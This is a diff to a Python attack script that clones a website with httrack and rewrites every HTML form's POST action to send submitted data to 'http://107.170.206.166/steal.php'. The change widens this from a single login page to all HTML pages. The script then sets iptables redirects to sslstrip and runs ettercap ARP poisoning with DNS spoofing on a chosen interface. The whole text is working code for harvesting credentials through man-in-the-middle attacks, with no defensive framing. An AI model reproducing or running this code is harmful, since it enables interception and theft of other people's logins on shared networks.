@@ -71,36 +71,28 @@ def update_etter_dns(conf_path):
         if new_line not in f.read():
             f.write(new_line)
 
-def update_login_page():
-    website_dir = os.getcwd() + "/" + sys.argv[1].rsplit('@',1)[-1]
-    login_path = None
-    listing = ""
-    for f in os.listdir(website_dir):
-        if "login" in f:
-            login_path = website_dir + "/" + f
-            listing += f + "\n"
-            break
-    if not login_path:
-        print("Listing of " + website_dir + ":")
-        print(listing)
-        login_path = website_dir + "/" + input("Input the name of the login page from" \
-            "the list above, otherwise input nothing.")
-    if login_path == website_dir:
-        return
+def update_form_action(login_path):
     with open(login_path, 'r') as f:
         f_data = f.readlines()
-    index = 0
+    index_list = []
     for i in range(len(f_data)):
-        l = f_data[i]
-        if "form" in l and "action" in l and "POST" in l.upper():
-            index = i
-            break
-    split_line = f_data[index].split("\"")
-    str_index = next(i for i, string in enumerate(split_line) if "action" in string)
-    f_data[index] = f_data[index].replace(split_line[str_index+1],"http://107.170.206.166/steal.php")
+        l = f_data[i].upper()
+        if "FORM" in l and "ACTION" in l and "POST" in l:
+            index_list.append(i)
+    for index in index_list:
+        split_line = f_data[index].split("\"")
+        str_index = next(i for i, string in enumerate(split_line) if "ACTION" in string.upper())
+        f_data[index] = f_data[index].replace(split_line[str_index+1],"http://107.170.206.166/steal.php")
     with open(login_path, 'w') as f:
         for l in f_data:
             f.write(l)
+
+def update_pages():
+    website_dir = os.getcwd() + "/" + sys.argv[1].rsplit('@',1)[-1]
+    for f in os.listdir(website_dir):
+        if f.endswith(".html"):
+            login_path = website_dir + "/" + f
+            update_form_action(login_path)
 
 def call_httrack(default_path):
     os.chdir(default_path)
@@ -110,12 +102,12 @@ def call_httrack(default_path):
             "--disable-security-limits","-A100000000","-s0","-n",sys.argv[1]])
     except KeyboardInterrupt:
         subprocess.call(["rm","hts-in_progress.lock"])
-    update_login_page()
+    update_pages()
     subprocess.call(["service","nginx","restart"])
     subprocess.call(["iptables","--flush","-t","nat"])
     subprocess.call(["iptables","-t","nat","-A","PREROUTING","-i",sys.argv[2],"-p","tcp","--destination-port", \
         "80","-j","REDIRECT","--to-port","6666"])
-    subprocess.Popen(["sslstrip","-w","sslstrip.log","-l","6666"], stderr=subprocess.DEVNULL)
+    subprocess.Popen(["sslstrip","-l","6666"], stderr=subprocess.DEVNULL)
     subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])
 
 def check_executables():
